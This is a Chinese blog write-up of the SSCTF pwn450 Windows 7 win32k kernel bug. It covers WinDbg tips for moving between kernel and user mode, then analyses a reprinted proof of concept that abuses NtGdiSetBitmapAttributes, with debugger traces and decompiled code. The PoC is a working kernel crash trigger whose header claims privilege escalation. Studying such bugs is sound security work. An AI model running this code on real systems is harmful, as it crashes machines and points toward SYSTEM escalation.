#  SSCTF-pwn450 win kernel 漏洞分析 （三）   
原创 3bytes  3072   2024-01-03 22:40  
  
#### 一 前言  
  
之前没有调试过内核的漏洞，以这道题目来入个门，发现其实除了一些内核结构体之外和用户态的分析也没有太大的区别，顺便在这里总结一种很方便的在内核态调试用户态程序的方法  
#### 二 内核态和用户态调试丝滑转换  
  
双机调试这里就不介绍了，设置个串口就行了，下面讲讲让windbg在用户态和内核态丝滑转换  
  
1 在虚拟机中创建下面的bat脚本  
```
"C:\Program Files\Debugging Tools for Windows (x86)\ntsd.exe"  -ddefer -y C:\Users\root\Desktop\SSCTFpwn450.pdb C:\Users\root\Desktop\SSCTFpwn450.exe
```  
  
在虚拟机上使用ntsd.exe 将dbg shell重定向到外部的windbg上，在主机的windbg已经挂在虚拟机上的情况下，运行上面的bat脚本会让外部的windbg 从内核态变成用户态  
  
2 通过 .sleep 7000 + ctrl break 命令让windbg从用户态进入内核态  
  
3 在内核态下断点 （注意，无法用kd对用户态的代码下断点，只能是内核态）  
  
4 通过g命令来运行到用户态，如果断点在进入用户态之前被断下直接不用管，因为此时你用户态的应用程序都没完全跑起来肯定不是你要的进程，在用户态继续g，会运行到该应用程序对应的内核调用，可以用kb和!process命令辅助查看程序断下时是否是预期的调用栈，不是继续g就行  
  
另外有些时候windbg断在了内核的其他进程中（按照上面的方法是不会的），这个时候就要用侵入式调试在目标进程下断点，方法如下  
  
1 !process 0 0 目标进程名 获取目标进程EPROCESS基本信息  
  
2 .process /p +EPROCESS信息 切换到目标进程空间  
  
3 .reload /f /user 强制重新加载用户态符号  
  
4 .process /i /p 目标进程的EPROCESS 侵入式调试  
  
5 ba 目标API 执行下断点命令  
#### 三 POC 分析  
```
/**
* Author: bee13oy of CloverSec Labs
* BSoD on Windows 7 SP1 x86 / Windows 10 x86
* EoP to SYSTEM on Windows 7 SP1 x86
**/

#include <Windows.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

unsigned int demo_CreateBitmapIndirect(void) {
    static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };
    static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,
        0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };

    bitmap.bmBits = bits;

    SetLastError(NO_ERROR);

    HBITMAP hBitmap = CreateBitmapIndirect(&bitmap);

    return (unsigned int)hBitmap;
}

#define eSyscall_NtGdiSetBitmapAttributes 0x1110

W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(
    HBITMAP argv0,
    DWORD argv1
    )
{
    __asm
    {
        push argv1;
        push argv0;
        push 0x00;
        mov eax, eSyscall_NtGdiSetBitmapAttributes;
        mov edx, addr_kifastsystemcall;
        call edx;
        add esp, 0x0c;
    }
}

void Trigger_BSoDPoc() {
    HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();
    HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);

    RECT rect = { 0 };
    rect.left = 0x368c;
    rect.top = 0x400000;
    HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);

    HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
    SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);

    HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);

    FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);
}

int _tmain(int argc, _TCHAR* argv[])
{
    Trigger_BSoDPoc();
    return 0;
}
```  
  
代码比较简单就是创建bitmap，然后调用NtGdiSetbitmapAttributes系统调用,之后便是创建DC，BRUSH，RGN等对象。但实际上POC中的只有bitmap数组后两位值，以及setbitmapattribute的第二个参数会影响内核是否会触发crash  
#### 四 调试分析  
  
漏洞触发的直接原因是SURFOBJ + C 没有正确初始化  
```
kd> g
Breakpoint 0 hit
win32k!EngPaint:
9aacb697 8bff            mov     edi,edi
kd> kb
 # ChildEBP RetAddr  Args to Child              
00 90b37a54 9aacbb9d fe723018 90b37a7c 90b37af8 win32k!EngPaint
01 90b37c20 83e411ea 00000000 ffbff968 0510021b win32k!NtGdiFillRgn+0x339
02 90b37c20 776370b4 00000000 ffbff968 0510021b nt!KiFastCallEntry+0x12a

BOOL __stdcall EngPaint(SURFOBJ *pso, CLIPOBJ *pco, BRUSHOBJ *pbo, POINTL *pptlBrushOrg, MIX mix)

根据栈帧和函数调用可以发现 fe723018 位置就是 SURFOBJ 对象

kd> g
Breakpoint 1 hit
win32k!bGetRealizedBrush:
9a9d0528 8bff            mov     edi,edi
kd> kb
 # ChildEBP RetAddr  Args to Child              
00 90b379a0 9a9d34af fd4d4d98 90b37af8 9a9cd5a0 win32k!bGetRealizedBrush
01 90b379b8 9aa49b5e 90b37af8 00000001 90b37a7c win32k!pvGetEngRbrush+0x1f


kd> dd 90b37af8
90b37af8  ffffffff 00000000 00000000 00edfc13
90b37b08  00edfc13 00000000 00000006 00000004
90b37b18  00000000 00ffffff fe4dd0a4 00000000
90b37b28  00000000 fe723008 ffbff968 ffbffe68
90b37b38  ffbbd540 00000006 fd4d4d98 00000014
90b37b48  000000af 00000001 00000000 00000000
90b37b58  90b37b70 9aa523eb 00000400 0000021b
90b37b68  90b37c10 c03bbf00 00000000 00000000

90b37af8 + 34h = fe723008

kd> dd fe723008
fe723008  04850220 00000001 80000000 876b1a70
fe723018  00000000 04850220 00000000 00000000
fe723028  00000008 00000008 00000020 fe72315c
fe723038  fe72315c 00000004 000016c5 00000001
fe723048  02010000 00000000 04000000 00000000
fe723058  ffbff968 00000000 00000000 00000000
fe723068  00000000 00000000 00000001 00000000
fe723078  00000000 00000000 00000000 00000000

fe723008 + 1ch = 0


fe723018 位置就是 SURFOBJ 结构体 

fe723008 + 1ch 实际上就是 SURFOBJ + c 

kd> g
Access violation - code c0000005 (!!! second chance !!!)
win32k!bGetRealizedBrush+0x38:
9a9d0560 f6402401        test    byte ptr [eax+24h],1
kd> kb
 # ChildEBP RetAddr  Args to Child              
00 90b379a0 9a9d34af 00000000 00000000 9a9cd5a0 win32k!bGetRealizedBrush+0x38
01 90b379b8 9aa49b5e 90b37af8 00000001 90b37a7c win32k!pvGetEngRbrush+0x1f
02 90b37a1c 9aacb6e8 fe723018 00000000 00000000 win32k!EngBitBlt+0x337
03 90b37a54 9aacbb9d fe723018 90b37a7c 90b37af8 win32k!EngPaint+0x51
04 90b37c20 83e411ea 00000000 ffbff968 0510021b win32k!NtGdiFillRgn+0x339


838aba40 8b99f8010000    mov     ebx,dword ptr [ecx+1F8h]


838abb98 e8fafaffff      call    win32k!EngPaint (838ab697)
```  
  
而SURFOBJ + C 没有正确初始化的直接原因是setbitmapattribute函数中bStockSurface的if条件不通过，从而不对该字段进行赋值  
```
 if ( v4 != (HDEV)SURFACE::pdibDefault )
        {
          INC_SHARE_REF_CNT(v4);
          ++*((_DWORD *)v4 + 0x1A);
          if ( !SURFACE::bStockSurface((SURFACE *)v4) )
          {
            v4[25] = *(_DWORD *)(HDEV)v15[0];
            v4[7] = *(_DWORD *)((char *)v15[0] + 0x24); // 对SURFOBJ + C 赋值
          }
        }
```  
  
为了通过setbitmapattribute bStockSurface以及createbitmap中的createDIB等函数的前置条件，因此必须设置POC中bitmap的后两位为1 1，且 setbitmapattribute 的第二个参数 & 1时不为0。其他条件都不会触发该漏洞  
```
    v19 = v6;
    if ( *((_DWORD *)v15[0] + 5) != 1
    || *((_DWORD *)v4 + 26) && !SURFACE::bStockSurface((SURFACE *)v4) && *((_DWORD *)v4 + 25) != *(_DWORD *)v5
    || !bIsCompatible((struct PALETTE **)&a1, *((struct PALETTE **)v4 + 20), (struct SURFACE *)v4, v19, 1) ) // bIsCompatible检查不通过
    {
    goto LABEL_62;
    }
```  
  
  
